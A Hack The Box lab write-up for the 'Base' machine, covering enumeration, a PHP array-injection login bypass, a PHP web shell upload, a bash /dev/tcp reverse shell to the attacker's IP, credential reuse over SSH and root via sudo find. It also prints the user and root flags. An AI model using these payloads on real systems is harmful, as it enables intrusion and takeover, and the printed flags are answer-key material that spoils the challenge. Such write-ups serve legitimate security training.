---
title: "HTB Base - Write-up"
description: "Hack The Box write-up for the 'Base' machine (Tier 2). Covers enumeration, authentication bypass, file upload, reverse shell, and privilege escalation."
tags: [HackTheBox, Web Exploitation, Privilege Escalation, PHP, Linux, CTF]
date: 2025-07-17
---

# HTB Base - Write-up

**Target IP**: 10.129.88.98  
**Attacker IP**: 10.10.14.129  
**Difficulty**: Easy  
**Tier**: 2  
**OS**: Linux

---

## 🔍 Enumeration

Performed service and version scanning with Nmap:

```bash
sudo nmap -sC -sV 10.129.88.98
```

**Results**:
- `22/tcp` – SSH Open
- `80/tcp` – Apache httpd 2.4.29 (Ubuntu)

Web interface on `http://10.129.88.98` led to a login page at:

```
http://10.129.88.98/login/login.php
```

Directory listing at `/login/` revealed:

- `config.php`
- `login.php`
- `login.php.swp` ← **interesting**

Analyzing `login.php.swp` (a leftover Vim swap file) revealed:
- Use of `strcmp()` to compare credentials
- Susceptible to **PHP array injection (type juggling)**:
  ```php
  username[]=admin&password[]=pass
  ```

---

## 🚪 Authentication Bypass & Foothold

Login bypass was successful by intercepting the POST request in Burp and sending:

```http
POST /login/login.php
username[]=admin&password[]=pass
```

This redirected to `/upload.php`, confirming authentication.

To access the upload page in browser or CLI:

```bash
curl -b "PHPSESSID=<your-session>" http://10.129.88.98/upload.php
```

---

## 📤 File Upload and Code Execution

Created a test PHP file:
```bash
echo "<?php phpinfo(); ?>" > test.php
```

Uploaded successfully.

Used `gobuster` to find the upload directory:
```bash
gobuster dir -u http://10.129.88.98/ -w /usr/share/wordlists/dirb/big.txt
```

Found:
```
http://10.129.88.98/_uploaded/
```

Uploaded a web shell:
```bash
echo "<?php echo system(\$_REQUEST['cmd']); ?>" > webshell.php
```

Confirmed execution:
```
http://10.129.88.98/_uploaded/webshell.php?cmd=id
```

Response:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🦻 Reverse Shell Access

Set up Netcat listener:

```bash
nc -lvnp 4444
```

Sent reverse shell payload (URL-encoded):

```
cmd=/bin/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.129/4444%200%3E%261%22
```

Connection received — shell established.

---

## 🔄 Post-Exploitation

- Read `config.php`:
  ```php
  $username = "admin";
  $password = "thisisagoodpassword";
  ```
- Found `/home/john` — attempted SSH with above creds:
  ```bash
  ssh john@10.129.88.98
  ```
- Success! Logged in as **john**.

---

## ⬆️ Privilege Escalation

Checked `sudo` permissions:
```bash
sudo -l
```

Output:
```
User john may run the following commands on base:
  (root : root) /usr/bin/find
```

Found privesc method via GTFOBins:
```bash
find . -exec /bin/sh \; -quit
```

Root shell obtained.

---

## 🏁 Flags

**User flag**:
```
f54846c258f3b4612f78a819573d158e
```

**Root flag**:
```
51709519ea18ab37dd6fc58096bea949
```

---

## ✅ Takeaways

- Learned how to identify and exploit a **PHP type juggling vulnerability**
- Practiced **file upload abuse**, **remote command execution**, and **reverse shell delivery**
- Demonstrated lateral movement via **hardcoded credentials** and **SSH access**
- Completed **HTB Tier 2**

---

## 🔖 Tags

`HTB` `Linux` `Privilege Escalation` `File Upload` `PHP Exploit` `Reverse Shell` `Type Juggling` `SSH` `Vim Swap`
